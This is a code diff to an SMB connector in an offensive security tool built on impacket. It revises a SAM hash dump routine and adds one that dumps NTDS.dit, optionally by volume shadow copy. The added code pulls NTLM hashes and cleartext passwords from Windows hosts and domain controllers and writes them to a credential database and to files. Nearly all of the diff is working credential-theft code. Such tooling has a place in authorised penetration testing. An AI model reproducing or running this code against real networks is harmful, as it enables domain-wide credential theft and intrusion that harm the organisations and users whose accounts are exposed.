@@ -1,4 +1,4 @@
-from time import sleep
+import os
 from random import choice
 from impacket.dcerpc.v5 import scmr
 from impacket.smb import SMB_DIALECT
@@ -8,14 +8,12 @@ from impacket.dcerpc.v5.rpcrt import DCERPCException
 from impacket.dcerpc.v5.transport import SMBTransport
 from impacket.dcerpc.v5.epm import MSRPC_UUID_PORTMAP
 from impacket.dcerpc.v5.transport import DCERPCTransportFactory
-from impacket.examples.secretsdump import RemoteOperations, SAMHashes
+from impacket.examples.secretsdump import RemoteOperations, SAMHashes, NTDSHashes
 
-
-from ar3.logger import highlight
 from ar3.helpers import remotefile
 from ar3.core.connector import Connector
 from ar3.ops.enum.polenum import SAMRDump
-
+from ar3.helpers.misc import validate_ntlm
 
 class SmbCon(Connector):
     def __init__(self, args, loggers, host, db):
@@ -30,9 +28,8 @@ class SmbCon(Connector):
         self.os_arch    = '0'
         self.remote_ops = None
         self.bootkey    = None
-
-        self.db   = db
-        self.port = 445
+        self.db         = db
+        self.port       = 445
 
     #########################
     # Session Management
@@ -228,9 +225,11 @@ class SmbCon(Connector):
 
     ################################
     # Dump SAM / LSA
+    #   Methods were modified from:
+    #     https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/protocols/smb.py
+    #     https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py
     ################################
     def enable_remoteops(self):
-        # Source: https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/protocols/smb.py
         if self.remote_ops is not None and self.bootkey is not None:
             return
         try:
@@ -241,26 +240,99 @@ class SmbCon(Connector):
             self.logger.fail('RemoteOperations failed for {}: {}'.format(self.host, str(e)))
 
     def sam(self):
+        def add_sam_hash(sam_hash, host):
+            self.logger.success([self.host, self.ip, "SAM HASH", sam_hash])
+            username, _, lmhash, nthash, _, _, _ = sam_hash.split(':')
+            self.db.update_user(username, '', host, "{}:{}".format(lmhash, nthash))
+            add_sam_hash.added_to_db += 1
+
         try:
+            add_sam_hash.added_to_db = 0
             self.enable_remoteops()
-
-            def add_sam_hash(sam_hash, host_id):
-                self.logger.success([self.host, highlight("SAM HASH"), sam_hash])
-                username, _, lmhash, nthash, _, _, _ = sam_hash.split(':')
-                self.db.update_user(username, '', host_id, "{}:{}".format(lmhash,nthash))
-
             if self.remote_ops and self.bootkey:
                 SAMFileName = self.remote_ops.saveSAM()
                 SAM = SAMHashes(SAMFileName, self.bootkey, isRemote=True, perSecretCallback=lambda secret: add_sam_hash(secret, self.host))
                 SAM.dump()
-
         except Exception as e:
-            self.logger.fail('SAM Extraction Failed for {}: {}'.format(self.host, str(e)))
-            try:
-                self.remote_ops.finish()
-            except Exception as e:
-                self.logger.debug("Error calling remote_ops.finish() for {}: {}".format(self.host, str(e)))
-        SAM.finish()
+            self.logger.debug('SAM Extraction Failed for {}: {}'.format(self.host, str(e)))
+
+        if add_sam_hash.added_to_db > 0:
+            self.logger.success([self.host, self.ip, "SAM HASH", '{} NTLM hashes added to the database'.format(add_sam_hash.added_to_db)])
+
+        try:
+            self.remote_ops.finish()
+            SAM.finish()
+        except Exception as e:
+            self.logger.debug(["SAM", "Error calling remote_ops.finish(): {}".format(e)])
+
+    def ntds(self):
+        def add_ntds_hash(ntds_hash):
+            if ntds_hash.find('$') == -1:
+                if "CLEARTEXT" in ntds_hash:
+                    try:
+                        add_ntds_hash.clear_text += 1
+                        username, password = ntds_hash.split(":CLEARTEXT:")
+                        domain, username = username.split("\\")
+                        self.db.update_user(username, '', domain, password)
+                        add_ntds_hash.added_to_db += 1
+                    except:
+                        self.logger.fail("Error adding clear text cred to db: {}".format(ntds_hash))
+                else:
+                    if ntds_hash.find('\\') != -1:
+                        domain, hash = ntds_hash.split('\\')
+                    else:
+                        domain = self.domain
+                        hash = ntds_hash
+
+                    try:
+                        username, _, lmhash, nthash, _, _, _ = hash.split(':')
+                        parsed_hash = ':'.join((lmhash, nthash))
+                        if validate_ntlm(parsed_hash):
+                            add_ntds_hash.ntds_hashes += 1
+                            self.db.update_user(username, '', domain, "{}:{}".format(lmhash,nthash))
+                            add_ntds_hash.added_to_db += 1
+                    except:
+                        self.logger.debug("Skipping non-NTLM hash: {}".format(ntds_hash))
+            else:
+                self.logger.debug("Skipping computer account")
+
+        try:
+            self.enable_remoteops()
+            use_vss_method = self.args.use_vss
+            NTDSFileName = None
+            add_ntds_hash.ntds_hashes = 0
+            add_ntds_hash.clear_text = 0
+            add_ntds_hash.added_to_db = 0
+            outfile = os.path.join(os.path.expanduser('~'), '.ar3', 'workspaces', self.args.workspace, self.domain)
+
+            if self.remote_ops and self.bootkey:
+                if self.args.ntds is 'vss':
+                    NTDSFileName = self.remote_ops.saveNTDS()
+                    use_vss_method = True
+
+                NTDS = NTDSHashes(NTDSFileName, self.bootkey, isRemote=True, history=False, noLMHash=True,
+                                  remoteOps=self.remote_ops, useVSSMethod=use_vss_method, justNTLM=False,
+                                  pwdLastSet=False, resumeSession=None, outputFileName=outfile,
+                                  justUser=None, printUserStatus=False,
+                                  perSecretCallback=lambda secretType, secret: add_ntds_hash(secret))
+
+                self.logger.info([self.host, self.ip, "NTDS", 'Dumping NTDS.dit, this could take a minute'])
+                NTDS.dump()
+
+                self.logger.success([self.host, self.ip, "NTDS", '{} NTLM hashes and {} clear text passwords collected'.format(add_ntds_hash.ntds_hashes, add_ntds_hash.clear_text)])
+                self.logger.success([self.host, self.ip, "NTDS", '{} creds added to the database'.format(add_ntds_hash.added_to_db)])
+                self.logger.info([self.host, self.ip, "NTDS", 'Hash files located at: {}'.format(outfile)])
+
+            else:
+                raise Exception("RemoteOps and BootKey not initiated")
+        except Exception as e:
+            self.logger.fail('NTDS Extraction Failed for {}: {}'.format(self.host, str(e)))
+
+        try:
+            self.remote_ops.finish()
+            NTDS.finish()
+        except Exception as e:
+            self.logger.debug(["NTDS", "Error calling remote_ops.finish(): {}".format(e)])
 
     ################################
     # File Interaction
